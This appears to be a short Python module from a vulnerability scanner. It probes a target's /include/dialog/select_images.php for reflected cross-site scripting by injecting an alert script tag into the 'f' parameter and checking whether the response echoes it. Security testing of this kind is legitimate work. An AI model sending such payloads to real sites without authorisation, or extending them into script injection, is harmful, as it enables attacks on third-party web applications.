import requests
from termcolor import cprint


class select_images_xss:

    def __init__(self,url):
        self.url = url

    def checktrace(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/include/dialog/select_images.php?f=<script>alert(/00day.cn/)</script>/*"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload

        try:
            r = requests.get(url=vulnurl,headers=headers)
            if r.status_code == 200 and "<script>alert(/00day.cn/)</script>" in r.content:
                cprint("target may be select_images.php xss:" + vulnurl,"red")
        except:
            return False